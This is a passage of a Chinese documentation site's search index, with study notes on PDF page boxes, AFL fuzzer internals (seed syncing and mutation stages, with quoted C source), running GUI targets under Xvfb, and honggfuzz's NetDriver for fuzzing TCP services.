Boxes"},{"location":"module/fileformat/pdf/#mediabox","text":"\u5bf9\u5927\u90e8\u5206\u7528\u6237\u6765\u8bf4\uff0cmediabox\u5bf9\u5e94\u7740pdf\u9875\u9762\u7684\u5b9e\u9645\u5927\u5c0f\u3002\u4f46\u5728\u7528\u4e8e\u51fa\u7248\u65f6\uff0cmediabox\u5305\u542b\u4e86\u66f4\u591a\u7684\u6709\u7528\u7684\u4fe1\u606f\uff08\u6bd4\u5982\u8bf4bleed\uff0c\u4fee\u5efa\u6807\u8bb0\uff0c\u6587\u4ef6\u540d\uff0c\u65e5\u671f\u7b49\u7b49\uff09\uff0c\u4fbf\u4e8e\u7f16\u8f91\u3002","title":"mediabox"},{"location":"module/fileformat/pdf/#bleedbox","text":"\u5982\u679c\u6587\u6863\u5e03\u5c40\u4e0a\u7684\u4efb\u4f55\u5143\u7d20\u4e0e\u6587\u6863\u8fb9\u7f18\u63a5\u89e6\uff0c\u5219\u4f7f\u7528bleed\u3002bleedbox\u7684\u5927\u5c0f\u4e0d\u540c\u5730\u65b9\u6709\u4e0d\u540c\u7684\u6807\u51c6\uff0c\u5e38\u89c1\u7684\u662f\u6bd4crop\u4e4b\u540e\u6bcf\u6761\u8fb9\u957f3~6mm\u3002 EPS ???","title":"bleedbox"},{"location":"module/fuzzing/afl/","text":"AFL \u00b6 \u79cd\u5b50\u540c\u6b65\u95ee\u9898 \u00b6 \u5982\u679c\u6211\u6709\u4e00\u4e2a\u597d\u7684\u79cd\u5b50\uff0c\u60f3\u8981\u52a0\u5165\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684AFL\u5b9e\u4f8b\u4e2d\uff0c\u600e\u4e48\u529e distributed mode \u00b6 \u5982\u679cAFL\u4ee5\u5e76\u884c\u6a21\u5f0f\u8fd0\u884c\uff08-M / -S\uff09\uff0c\u6bd4\u8f83\u597d\u529e AFL\u5e76\u884c\u6a21\u5f0f\u540c\u6b65\u673a\u5236 \u00b6 \u5173\u952e\u6570\u636esync_dir\u548csync_id EXP_ST u8 * sync_dir, /* Synchronization directory */ * sync_id, /* Fuzzer ID */ sync_id\u5c31\u662f -M / -S \u540e\u9762\u7684\u53c2\u6570 case 'M' : { /* master sync ID */ u8 * c; if (sync_id) FATAL( \"Multiple -S or -M options not supported\" ); sync_id = ck_strdup(optarg); sync_dir\u7684\u503c\u7b49\u4e8e-o \u540e\u9762\u7684\u53c2\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u5e76\u884c\u6a21\u5f0f\u4e0bout\u76ee\u5f55\u53d8\u6210sync_dir, \u771f\u6b63\u7684out\u76ee\u5f55\u53d8\u6210 sync_dir/sync_id static void fix_up_sync ( void ) { //... x = alloc_printf( \"%s/%s\" , out_dir, sync_id); sync_dir = out_dir; out_dir = x; //... \u6267\u884c\u540c\u6b65\u7684\u51fd\u6570 sync_fuzzers static void sync_fuzzers ( char ** argv) { DIR * sd; struct dirent * sd_ent; u32 sync_cnt = 0 ; sd = opendir(sync_dir); if ( ! sd) PFATAL( \"Unable to open '%s'\" , sync_dir); stage_max = stage_cur = 0 ; cur_depth = 0 ; /* Look at the entries created for every other fuzzer in the sync directory. */ while ((sd_ent = readdir(sd))) { static u8 stage_tmp[ 128 ]; DIR * qd; struct dirent * qd_ent; u8 * qd_path, * qd_synced_path; u32 min_accept = 0 , next_min_accept; s32 id_fd; /* Skip dot files and our own output directory. */ if (sd_ent -> d_name[ 0 ] == '.' || ! strcmp(sync_id, sd_ent -> d_name)) continue ; /* Skip anything that doesn't have a queue/ subdirectory. */ /* \u8df3\u8fc7\u6ca1\u6709queue\u8fd9\u4e2a\u5b50\u76ee\u5f55\u7684\u6587\u4ef6\u5939 */ qd_path = alloc_printf( \"%s/%s/queue\" , sync_dir, sd_ent -> d_name); if ( ! (qd = opendir(qd_path))) { ck_free(qd_path); continue ; } /* Retrieve the ID of the last seen test case. */ qd_synced_path = alloc_printf( \"%s/.synced/%s\" , out_dir, sd_ent -> d_name); id_fd = open(qd_synced_path, O_RDWR | O_CREAT, 0600 ); if (id_fd < 0 ) PFATAL( \"Unable to create '%s'\" , qd_synced_path); if (read(id_fd, & min_accept, sizeof (u32)) > 0 ) lseek(id_fd, 0 , SEEK_SET); /* \u83b7\u53d6\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u4e0a\u6b21\u540c\u6b65\u7684\u79cd\u5b50id + 1 next_min_accept = min_accept; /* Show stats */ sprintf(stage_tmp, \"sync %u\" , ++ sync_cnt); stage_name = stage_tmp; stage_cur = 0 ; stage_max = 0 ; /* For every file queued by this fuzzer, parse ID and see if we have looked at it before; exec a test case if not. */ while ((qd_ent = readdir(qd))) { /* \u6253\u5f00\u53e6\u4e00\u4e2afuzz\u5b9e\u4f8b\u7684out\u76ee\u5f55\u4e0b\u7684queue\u6587\u4ef6\u5939 u8* path; s32 fd; struct stat st; /* \u6392\u9664 '.'\u5f00\u5934\u7684\u6587\u4ef6\uff0c\u6392\u9664\u975eid:XXXXXX\u5f00\u5934\u7684\u6587\u4ef6\uff0c\u6392\u9664XXXXXX\u5c0f\u4e8e\u4e0a\u6b21\u8bb0\u5f55\u7684id\u7684\u6587\u4ef6 */ if (qd_ent -> d_name[ 0 ] == '.' || sscanf(qd_ent -> d_name, CASE_PREFIX \"%06u\" , & syncing_case) != 1 || syncing_case < min_accept) continue ; /* OK, sounds like a new one. Let's give it a try. */ if (syncing_case >= next_min_accept) next_min_accept = syncing_case + 1 ; path = alloc_printf( \"%s/%s\" , qd_path, qd_ent -> d_name); /* Allow this to fail in case the other fuzzer is resuming or so... */ fd = open(path, O_RDONLY); if (fd < 0 ) { ck_free(path); continue ; } if (fstat(fd, & st)) PFATAL( \"fstat() failed\" ); /* Ignore zero-sized or oversized files. */ if (st.st_size && st.st_size <= MAX_FILE) { u8 fault; u8 * mem = mmap( 0 , st.st_size, PROT_READ, MAP_PRIVATE, fd, 0 ); if (mem == MAP_FAILED) PFATAL( \"Unable to mmap '%s'\" , path); /* See what happens. We rely on save_if_interesting() to catch major errors and save the test case. */ write_to_testcase(mem, st.st_size); fault = run_target(argv, exec_tmout); if (stop_soon) return ; syncing_party = sd_ent -> d_name; queued_imported += save_if_interesting(argv, mem, st.st_size, fault); syncing_party = 0 ; munmap(mem, st.st_size); if ( ! (stage_cur ++ % stats_update_freq)) show_stats(); } ck_free(path); close(fd); } ck_write(id_fd, & next_min_accept, sizeof (u32), qd_synced_path); close(id_fd); closedir(qd); ck_free(qd_path); ck_free(qd_synced_path); } closedir(sd); } \u5927\u81f4\u6d41\u7a0b for \u76ee\u5f55 in \u6253\u5f00sync_dir\u76ee\u5f55\u5e76\u83b7\u53d6\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u76ee\u5f55 do if \u76ee\u5f55\u6ca1\u6709queue\u8fd9\u4e2a\u5b50\u76ee\u5f55 -o \u76ee\u5f55\u540d\u79f0\u7b49\u4e8e\u5f53\u524dsync_id, \u5373\u4e0d\u540c\u6b65\u81ea\u5df1 ; then \u8df3\u8fc7 ; fi \u83b7\u53d6\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u4e0a\u6b21\u540c\u6b65\u7684\u79cd\u5b50id + 1 for seed in \u6253\u5f00queue\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6 do if '.' \u5f00\u5934\u7684\u6587\u4ef6 -o \u975eid:XXXXXX\u5f00\u5934\u7684\u6587\u4ef6 -o id:XXXXXX\u5c0f\u4e8e\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c ; then \u8df3\u8fc7 ; fi \u66f4\u65b0\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u5f53\u524did + 1 save_if_interesting ( argv, mem, st.st_size, fault ) ; done done save_if_interesting \u6d41\u7a0b \u5728\u975ecrash_mode\u4e0b\uff0c\u540c\u6b65\u7684\u79cd\u5b50\u5982\u679c\u8d85\u65f6\u6216\u8005\u5d29\u6e83\uff0c\u662f\u4e0d\u4f1a\u52a0\u5165\u961f\u5217\u7684\u3002\u5982\u679cbitmap\u6709\u66f4\u65b0\uff0c\u662f\u4f1a\u8ba1\u5165hangs\u6216\u8005crashes \u5728crash_mode\u4e0b\uff0c\u540c\u6b65\u7684\u79cd\u5b50\u5d29\u6e83\uff0c\u52a0\u5165\u961f\u5217\uff0c\u5982\u679cbitmap\u6709\u66f4\u65b0\u8ba1\u5165crashes\u3002\u8d85\u65f6\u5904\u7406\u4e0e\u975ecrash_mode\u76f8\u540c static u8 save_if_interesting ( char ** argv, void * mem, u32 len, u8 fault) { // ... if (fault == crash_mode) { /* crash_mode \u9ed8\u8ba4\u4e3a0\uff0c\u4e5f\u5c31\u662fFAULT_NONE, '-C' \u6307\u5b9acrash_mode\u4e3aFAULT_CRASH */ /* bitmap\u4e0d\u66f4\u65b0\u76f4\u63a5\u8fd4\u56de */ // ... fn = alloc_printf( \"%s/queue/id:%06u,%s\" , out_dir, queued_paths, describe_op(hnb)); // ... keeping = 1 ; } switch (fault) { case FAULT_TMOUT: /* \u5982\u679c\u6ca1\u6709\u66f4\u65b0\u6216\u8005\u5927\u4e8e\u4e0a\u9650\u76f4\u63a5\u8fd4\u56de */ // .. fn = alloc_printf( \"%s/hangs/id:%06llu,%s\" , out_dir, unique_hangs, describe_op( 0 )); // ... case FAULT_CRASH: /* \u5982\u679c\u6ca1\u6709\u66f4\u65b0\u6216\u8005\u5927\u4e8e\u4e0a\u9650\u76f4\u63a5\u8fd4\u56de */ // ... fn = alloc_printf( \"%s/crashes/id:%06llu,sig:%02u,%s\" , out_dir, unique_crashes, kill_signal, describe_op( 0 )); // ... } /* If we're here, we apparently want to save the crash or hang test case, too. */ // ... return keeping; } AFL_HANG_TMOUT \u975eparallel\u6a21\u5f0f \u00b6 \u9664\u4e86\u6539\u6e90\u7801\u6682\u65f6\u6ca1\u770b\u5230\u597d\u7684\u529e\u6cd5 \u4e00\u4e2a\u79cd\u5b50\u6700\u591a\u53ef\u4ee5\u53d8\u5f02\u591a\u5c11\u6b21 \u00b6 \u6267\u884c\u4e00\u6b21\uff0ctotal_execs \u81ea\u589e1 static u8 run_target ( char ** argv, u32 timeout) { // ... total_execs ++ ; \u8c03\u7528\u4e86 run_target \u7684\u51fd\u6570 calibrate_case save_if_interesting // \u53ef\u4ee5\u5ffd\u7565 \u53ea\u5728exec_tmout < hang_tmout\u624d\u6709\u53ef\u80fd\u6267\u884c trim_case common_fuzz_stuff sync_fuzzers // \u5ffd\u7565 \u51fd\u6570fuzz_one static u8 fuzz_one ( char ** argv) { // ... /******************************************* * CALIBRATION (only if failed earlier on) * *******************************************/ res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1 , 0 ); /************ * TRIMMING * ************/ u8 res = trim_case(argv, queue_cur, in_buf); /********************* * PERFORMANCE SCORE * *********************/ // none /********************************************* * SIMPLE BITFLIP (+dictionary construction) * *********************************************/ // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e00\u4f4d\u4e00\u4f4d\u5730\u7ffb\uff0c \u6b65\u957f1\u4e2abit for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur >> 3 ; FLIP_BIT(out_buf, stage_cur); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e24\u4f4d\u4e00\u7ffb\uff0c \u6b65\u957f1\u4e2abit for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur >> 3 ; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1 ); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1 ); } // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c4\u4f4d\u4e00\u7ffb\uff0c \u6b65\u957f1\u4e2abit // ... // stage_max \u7b49\u4e8elen , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e00\u6b21\u7ffb\u4e00\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur; out_buf[stage_cur] ^= 0xFF ; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; // \u4e00\u6b21\u7ffb2\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte // ... // \u4e00\u6b21\u7ffb4\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte // ... /********************** * ARITHMETIC INC/DEC * **********************/ \u8ddf\u79cd\u5b50\u5927\u5c0f\u548c\u4f18\u52a3\u6709\u5f88\u5927\u5173\u7cfb\uff0c \u6682\u505c\u5206\u6790","title":"afl"},{"location":"module/fuzzing/afl/#afl","text":"","title":"AFL"},{"location":"module/fuzzing/afl/#_1","text":"\u5982\u679c\u6211\u6709\u4e00\u4e2a\u597d\u7684\u79cd\u5b50\uff0c\u60f3\u8981\u52a0\u5165\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684AFL\u5b9e\u4f8b\u4e2d\uff0c\u600e\u4e48\u529e","title":"\u79cd\u5b50\u540c\u6b65\u95ee\u9898"},{"location":"module/fuzzing/afl/#distributed-mode","text":"\u5982\u679cAFL\u4ee5\u5e76\u884c\u6a21\u5f0f\u8fd0\u884c\uff08-M / -S\uff09\uff0c\u6bd4\u8f83\u597d\u529e","title":"distributed mode"},{"location":"module/fuzzing/afl/#afl_1","text":"\u5173\u952e\u6570\u636esync_dir\u548csync_id EXP_ST u8 * sync_dir, /* Synchronization directory */ * sync_id, /* Fuzzer ID */ sync_id\u5c31\u662f -M / -S \u540e\u9762\u7684\u53c2\u6570 case 'M' : { /* master sync ID */ u8 * c; if (sync_id) FATAL( \"Multiple -S or -M options not supported\" ); sync_id = ck_strdup(optarg); sync_dir\u7684\u503c\u7b49\u4e8e-o \u540e\u9762\u7684\u53c2\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u5e76\u884c\u6a21\u5f0f\u4e0bout\u76ee\u5f55\u53d8\u6210sync_dir, \u771f\u6b63\u7684out\u76ee\u5f55\u53d8\u6210 sync_dir/sync_id static void fix_up_sync ( void ) { //... x = alloc_printf( \"%s/%s\" , out_dir, sync_id); sync_dir = out_dir; out_dir = x; //... \u6267\u884c\u540c\u6b65\u7684\u51fd\u6570 sync_fuzzers static void sync_fuzzers ( char ** argv) { DIR * sd; struct dirent * sd_ent; u32 sync_cnt = 0 ; sd = opendir(sync_dir); if ( ! sd) PFATAL( \"Unable to open '%s'\" , sync_dir); stage_max = stage_cur = 0 ; cur_depth = 0 ; /* Look at the entries created for every other fuzzer in the sync directory. */ while ((sd_ent = readdir(sd))) { static u8 stage_tmp[ 128 ]; DIR * qd; struct dirent * qd_ent; u8 * qd_path, * qd_synced_path; u32 min_accept = 0 , next_min_accept; s32 id_fd; /* Skip dot files and our own output directory. */ if (sd_ent -> d_name[ 0 ] == '.' || ! strcmp(sync_id, sd_ent -> d_name)) continue ; /* Skip anything that doesn't have a queue/ subdirectory. */ /* \u8df3\u8fc7\u6ca1\u6709queue\u8fd9\u4e2a\u5b50\u76ee\u5f55\u7684\u6587\u4ef6\u5939 */ qd_path = alloc_printf( \"%s/%s/queue\" , sync_dir, sd_ent -> d_name); if ( ! (qd = opendir(qd_path))) { ck_free(qd_path); continue ; } /* Retrieve the ID of the last seen test case. */ qd_synced_path = alloc_printf( \"%s/.synced/%s\" , out_dir, sd_ent -> d_name); id_fd = open(qd_synced_path, O_RDWR | O_CREAT, 0600 ); if (id_fd < 0 ) PFATAL( \"Unable to create '%s'\" , qd_synced_path); if (read(id_fd, & min_accept, sizeof (u32)) > 0 ) lseek(id_fd, 0 , SEEK_SET); /* \u83b7\u53d6\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u4e0a\u6b21\u540c\u6b65\u7684\u79cd\u5b50id + 1 next_min_accept = min_accept; /* Show stats */ sprintf(stage_tmp, \"sync %u\" , ++ sync_cnt); stage_name = stage_tmp; stage_cur = 0 ; stage_max = 0 ; /* For every file queued by this fuzzer, parse ID and see if we have looked at it before; exec a test case if not. */ while ((qd_ent = readdir(qd))) { /* \u6253\u5f00\u53e6\u4e00\u4e2afuzz\u5b9e\u4f8b\u7684out\u76ee\u5f55\u4e0b\u7684queue\u6587\u4ef6\u5939 u8* path; s32 fd; struct stat st; /* \u6392\u9664 '.'\u5f00\u5934\u7684\u6587\u4ef6\uff0c\u6392\u9664\u975eid:XXXXXX\u5f00\u5934\u7684\u6587\u4ef6\uff0c\u6392\u9664XXXXXX\u5c0f\u4e8e\u4e0a\u6b21\u8bb0\u5f55\u7684id\u7684\u6587\u4ef6 */ if (qd_ent -> d_name[ 0 ] == '.' || sscanf(qd_ent -> d_name, CASE_PREFIX \"%06u\" , & syncing_case) != 1 || syncing_case < min_accept) continue ; /* OK, sounds like a new one. Let's give it a try. */ if (syncing_case >= next_min_accept) next_min_accept = syncing_case + 1 ; path = alloc_printf( \"%s/%s\" , qd_path, qd_ent -> d_name); /* Allow this to fail in case the other fuzzer is resuming or so... */ fd = open(path, O_RDONLY); if (fd < 0 ) { ck_free(path); continue ; } if (fstat(fd, & st)) PFATAL( \"fstat() failed\" ); /* Ignore zero-sized or oversized files. */ if (st.st_size && st.st_size <= MAX_FILE) { u8 fault; u8 * mem = mmap( 0 , st.st_size, PROT_READ, MAP_PRIVATE, fd, 0 ); if (mem == MAP_FAILED) PFATAL( \"Unable to mmap '%s'\" , path); /* See what happens. We rely on save_if_interesting() to catch major errors and save the test case. */ write_to_testcase(mem, st.st_size); fault = run_target(argv, exec_tmout); if (stop_soon) return ; syncing_party = sd_ent -> d_name; queued_imported += save_if_interesting(argv, mem, st.st_size, fault); syncing_party = 0 ; munmap(mem, st.st_size); if ( ! (stage_cur ++ % stats_update_freq)) show_stats(); } ck_free(path); close(fd); } ck_write(id_fd, & next_min_accept, sizeof (u32), qd_synced_path); close(id_fd); closedir(qd); ck_free(qd_path); ck_free(qd_synced_path); } closedir(sd); } \u5927\u81f4\u6d41\u7a0b for \u76ee\u5f55 in \u6253\u5f00sync_dir\u76ee\u5f55\u5e76\u83b7\u53d6\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u76ee\u5f55 do if \u76ee\u5f55\u6ca1\u6709queue\u8fd9\u4e2a\u5b50\u76ee\u5f55 -o \u76ee\u5f55\u540d\u79f0\u7b49\u4e8e\u5f53\u524dsync_id, \u5373\u4e0d\u540c\u6b65\u81ea\u5df1 ; then \u8df3\u8fc7 ; fi \u83b7\u53d6\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u4e0a\u6b21\u540c\u6b65\u7684\u79cd\u5b50id + 1 for seed in \u6253\u5f00queue\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6 do if '.' \u5f00\u5934\u7684\u6587\u4ef6 -o \u975eid:XXXXXX\u5f00\u5934\u7684\u6587\u4ef6 -o id:XXXXXX\u5c0f\u4e8e\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c ; then \u8df3\u8fc7 ; fi \u66f4\u65b0\u6700\u5c0f\u53ef\u63a5\u53d7id\u503c\uff0c\u5176\u503c\u7b49\u4e8e\u5f53\u524did + 1 save_if_interesting ( argv, mem, st.st_size, fault ) ; done done save_if_interesting \u6d41\u7a0b \u5728\u975ecrash_mode\u4e0b\uff0c\u540c\u6b65\u7684\u79cd\u5b50\u5982\u679c\u8d85\u65f6\u6216\u8005\u5d29\u6e83\uff0c\u662f\u4e0d\u4f1a\u52a0\u5165\u961f\u5217\u7684\u3002\u5982\u679cbitmap\u6709\u66f4\u65b0\uff0c\u662f\u4f1a\u8ba1\u5165hangs\u6216\u8005crashes \u5728crash_mode\u4e0b\uff0c\u540c\u6b65\u7684\u79cd\u5b50\u5d29\u6e83\uff0c\u52a0\u5165\u961f\u5217\uff0c\u5982\u679cbitmap\u6709\u66f4\u65b0\u8ba1\u5165crashes\u3002\u8d85\u65f6\u5904\u7406\u4e0e\u975ecrash_mode\u76f8\u540c static u8 save_if_interesting ( char ** argv, void * mem, u32 len, u8 fault) { // ... if (fault == crash_mode) { /* crash_mode \u9ed8\u8ba4\u4e3a0\uff0c\u4e5f\u5c31\u662fFAULT_NONE, '-C' \u6307\u5b9acrash_mode\u4e3aFAULT_CRASH */ /* bitmap\u4e0d\u66f4\u65b0\u76f4\u63a5\u8fd4\u56de */ // ... fn = alloc_printf( \"%s/queue/id:%06u,%s\" , out_dir, queued_paths, describe_op(hnb)); // ... keeping = 1 ; } switch (fault) { case FAULT_TMOUT: /* \u5982\u679c\u6ca1\u6709\u66f4\u65b0\u6216\u8005\u5927\u4e8e\u4e0a\u9650\u76f4\u63a5\u8fd4\u56de */ // .. fn = alloc_printf( \"%s/hangs/id:%06llu,%s\" , out_dir, unique_hangs, describe_op( 0 )); // ... case FAULT_CRASH: /* \u5982\u679c\u6ca1\u6709\u66f4\u65b0\u6216\u8005\u5927\u4e8e\u4e0a\u9650\u76f4\u63a5\u8fd4\u56de */ // ... fn = alloc_printf( \"%s/crashes/id:%06llu,sig:%02u,%s\" , out_dir, unique_crashes, kill_signal, describe_op( 0 )); // ... } /* If we're here, we apparently want to save the crash or hang test case, too. */ // ... return keeping; } AFL_HANG_TMOUT","title":"AFL\u5e76\u884c\u6a21\u5f0f\u540c\u6b65\u673a\u5236"},{"location":"module/fuzzing/afl/#parallel","text":"\u9664\u4e86\u6539\u6e90\u7801\u6682\u65f6\u6ca1\u770b\u5230\u597d\u7684\u529e\u6cd5","title":"\u975eparallel\u6a21\u5f0f"},{"location":"module/fuzzing/afl/#_2","text":"\u6267\u884c\u4e00\u6b21\uff0ctotal_execs \u81ea\u589e1 static u8 run_target ( char ** argv, u32 timeout) { // ... total_execs ++ ; \u8c03\u7528\u4e86 run_target \u7684\u51fd\u6570 calibrate_case save_if_interesting // \u53ef\u4ee5\u5ffd\u7565 \u53ea\u5728exec_tmout < hang_tmout\u624d\u6709\u53ef\u80fd\u6267\u884c trim_case common_fuzz_stuff sync_fuzzers // \u5ffd\u7565 \u51fd\u6570fuzz_one static u8 fuzz_one ( char ** argv) { // ... /******************************************* * CALIBRATION (only if failed earlier on) * *******************************************/ res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1 , 0 ); /************ * TRIMMING * ************/ u8 res = trim_case(argv, queue_cur, in_buf); /********************* * PERFORMANCE SCORE * *********************/ // none /********************************************* * SIMPLE BITFLIP (+dictionary construction) * *********************************************/ // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e00\u4f4d\u4e00\u4f4d\u5730\u7ffb\uff0c \u6b65\u957f1\u4e2abit for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur >> 3 ; FLIP_BIT(out_buf, stage_cur); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e24\u4f4d\u4e00\u7ffb\uff0c \u6b65\u957f1\u4e2abit for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur >> 3 ; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1 ); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1 ); } // stage_max \u7b49\u4e8elen << 3 , len \u79cd\u5b50\u5927\u5c0f\uff0c4\u4f4d\u4e00\u7ffb\uff0c \u6b65\u957f1\u4e2abit // ... // stage_max \u7b49\u4e8elen , len \u79cd\u5b50\u5927\u5c0f\uff0c\u4e00\u6b21\u7ffb\u4e00\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte for (stage_cur = 0 ; stage_cur < stage_max; stage_cur ++ ) { stage_cur_byte = stage_cur; out_buf[stage_cur] ^= 0xFF ; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; // \u4e00\u6b21\u7ffb2\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte // ... // \u4e00\u6b21\u7ffb4\u4e2a\u5b57\u8282\uff0c\u6b65\u957f1\u4e2abyte // ... /********************** * ARITHMETIC INC/DEC * **********************/ \u8ddf\u79cd\u5b50\u5927\u5c0f\u548c\u4f18\u52a3\u6709\u5f88\u5927\u5173\u7cfb\uff0c \u6682\u505c\u5206\u6790","title":"\u4e00\u4e2a\u79cd\u5b50\u6700\u591a\u53ef\u4ee5\u53d8\u5f02\u591a\u5c11\u6b21"},{"location":"module/fuzzing/gui/","text":"fuzzing for GUI \u00b6 \u5982\u4f55\u6d88\u9664\u56fe\u5f62\u754c\u9762\u5bf9\u5de5\u4f5c\u7684\u5e72\u6270 \u00b6 Xvfb nohup Xvfb -ac :7 -screen 0 1280x1024x8 > /dev/null 2 > & 1 & export DISPLAY = :7 # -ac \u7981\u7528\u8bbf\u95ee\u63a7\u5236\u9650\u5236 # -screen scrn WxHxD set screen's width, height, depth \u5173\u95ed\u56fe\u5f62\u754c\u9762\u4e00\u79cd\u65b9\u6cd5\uff08for aflfuzz\uff09 \u00b6 \u4fee\u6539afl-fuzz.c\u4e2d\u51fd\u6570run_target \u7684FAULT_TIMOUT \u6210 FAULT_NONE persistent mode + gui model \u00b6","title":"GUI"},{"location":"module/fuzzing/gui/#fuzzing-for-gui","text":"","title":"fuzzing for GUI"},{"location":"module/fuzzing/gui/#_1","text":"Xvfb nohup Xvfb -ac :7 -screen 0 1280x1024x8 > /dev/null 2 > & 1 & export DISPLAY = :7 # -ac \u7981\u7528\u8bbf\u95ee\u63a7\u5236\u9650\u5236 # -screen scrn WxHxD set screen's width, height, depth","title":"\u5982\u4f55\u6d88\u9664\u56fe\u5f62\u754c\u9762\u5bf9\u5de5\u4f5c\u7684\u5e72\u6270"},{"location":"module/fuzzing/gui/#for-aflfuzz","text":"\u4fee\u6539afl-fuzz.c\u4e2d\u51fd\u6570run_target \u7684FAULT_TIMOUT \u6210 FAULT_NONE","title":"\u5173\u95ed\u56fe\u5f62\u754c\u9762\u4e00\u79cd\u65b9\u6cd5\uff08for aflfuzz\uff09"},{"location":"module/fuzzing/gui/#persistent-mode-gui-model","text":"","title":"persistent mode + gui model"},{"location":"module/fuzzing/honggfuzz/","text":"Honggfuzz \u00b6 Honggfuzz NetDriver \u00b6 \u5982\u679c\u6211\u4eec\u8981\u5b9e\u73b0\u4e00\u4e2a\u76f8\u5f53\u5065\u58ee\u7684TCP\u670d\u52a1\u7684fuzzing\uff0c\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u6807\u9700\u8981\u505a\u5230\u54ea\u4e9b \u80fd\u4e0e\u73b0\u6709TCP\u670d\u52a1\u96c6\u6210\u7684\u4e00\u5c0f\u6bb5\u4ee3\u7801\uff0c\u6bd4\u5982\u8bf4\uff0c\u4e00\u4e2a\u80fd\u591f\u88abApache\u7684HTTP\u94fe\u63a5\u7684\u9759\u6001\u6216\u52a8\u6001\u5e93\uff0c\uff08\u8fd9\u91cc\u53ef\u4ee5\u4f7fhttpd\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff09 \u5c06\u6765\u81ea\u5185\u5b58\u6570\u7ec4\u548c\u957f\u5ea6\u6807\u8bc6\u7684\u8f93\u5165\u8f6c\u6210TCP\u6d41\u7684\u6280\u672f \u5f53\u8f93\u5165\u7f13\u51b2\u533a\u6ca1\u6709\u4efb\u4f55\u6570\u636e\u65f6\uff0c\u6709\u65b9\u6cd5\u53bb\u901a\u77e5TCP \u670d\u52a1\u7aef\u7ed3\u675f\u8fde\u63a5\uff1b\u5426\u5219TCP\u670d\u52a1\u7aef\u5c06\u4e00\u76f4\u6302\u8d77\uff0c\u6216\u8005\u8d85\u65f6\u4e2d\u65ad\u8fde\u63a5\uff0c\u6216\u8005\u8d85\u8fc7fuzzer\u8bbe\u5b9a\u7684timeout \u5982\u679c\u8bb8\u591a\u76f8\u540c\u7684TCP\u670d\u52a1\u5668\u540c\u65f6\u5728\u76f8\u540c\u7684\u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u914d\u7f6e\u76f8\u540c(\u6216\u8005\u9ed8\u8ba4\u914d\u7f6e)\uff0c\u90a3\u4e48\u5b83\u4eec\u4e5f\u4f1a\u7ed1\u5b9a\u5230\u6570\u5b57\u4e0a\u76f8\u540c\u7684TCP\u7aef\u53e3\u3002\u5f53\u7136\uff0c\u53ea\u6709\u5f53\u6211\u4eec\u6253\u7b97\u540c\u65f6Fuzz\u540c\u4e00\u4e2aTCP\u670d\u52a1\u5668\u7684\u591a\u4e2a\u5b9e\u4f8b\u65f6\uff0c\u8fd9\u624d\u91cd\u8981(\u4f7f\u7528honggfuzz\u53ef\u4ee5\u8f7b\u677e\u505a\u5230\u4ec0\u4e48) 